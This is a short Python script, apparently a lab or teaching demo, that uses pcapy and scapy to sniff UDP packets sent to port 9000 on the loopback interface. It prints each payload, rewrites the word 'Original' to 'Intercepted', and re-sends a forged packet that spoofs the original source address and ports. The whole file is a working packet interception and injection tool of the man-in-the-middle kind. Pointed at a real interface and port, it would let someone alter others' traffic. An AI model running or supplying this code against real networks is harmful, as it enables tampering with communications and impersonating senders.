import pcapy
from scapy.all import *

def processing(data, port):
    eth = Ether(data)
    if eth.haslayer(IP) and eth.haslayer(UDP):
        ip = eth[IP]
        udp = eth[UDP]
        if udp.dport == port and Raw in udp:
            original_msg = udp[Raw].load.decode(errors='ignore')
            print(f"[+] Inttercepted: {original_msg}")
            corrupted_msg = original_msg.replace("Original", "Intercepted")
            corrupted_packet = IP(src=ip.src, dst=ip.dst) / UDP(sport=udp.sport, dport=udp.dport) / Raw(load=corrupted_msg)
            send(corrupted_packet)
            print("[*] Corrupted packet sent to server.")

def change_packets(interface, port):
    filtro_bpf = f"udp dst port {port}"
    print(f"[*] Listening on interface {interface}. Filter: '{filtro_bpf}'")
    cap = pcapy.open_live(interface, 65536, 1, 0)
    cap.setfilter(filtro_bpf)
    while True:
        try:
            header, packet = cap.next()
            if packet:
                processing(packet, port)
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    interface = "lo"
    target_port = 9000
    change_packets(interface, target_port)
